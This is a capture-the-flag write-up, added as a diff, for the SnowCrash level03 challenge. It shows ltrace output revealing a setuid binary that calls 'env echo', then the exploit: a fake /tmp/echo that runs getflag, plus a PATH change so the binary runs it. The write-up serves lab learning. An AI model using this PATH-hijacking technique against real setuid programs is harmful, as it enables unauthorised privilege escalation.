@@ -1,0 +1,47 @@
+In the home there is an executable called level03.
+We can execute it and it prints "Exploit me".
+
+So here we go, we started to analyze the file it should be an ELF.
+Let's confirm that, using readelf -a level03
+
+We can see that this file is indeed an ELF, a 32 bit one exactly.
+We need more than that, so let's dig deeper on this mysterious file.
+
+With the help of ltrace we execute the file and ltrace will intercept and record all the dynamic library
+calls but also all the system calls exexecuted by the program.
+
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                               = 2003
+geteuid()                                                               = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                  = 0
++++ exited (status 0) +++
+
+Let's see the output of ltrace.
+There are 2 calls to getegid, and 2 calls to setresgid and 1 system call to /usr/bin/env echo
+This is where we are heading, we need to change the call to echo to something else but to what ??
+The goal of this project is to get the flag right ? Why not try to execute the getflag function ? Let's try that
+
+We see it calls /usr/bin/env to call echo, we can exploit this.
+Let's create a custom echo.
+
+After few minutes to find a decent way to export the echo variable to launch the getflag we finally have the flag.
+
+To do so we first export the getflag to a temporary echo file in /tmp
+
+echo "getflag" > /tmp/echo
+
+Then we need to have the execution right on it
+
+chmod +x /tmp/echo
+
+After that we would like to add this new echo to the PATH
+
+export PATH=/tmp:$PATH
+
+With all that we can relaunch the ./level03 and we get the flag !
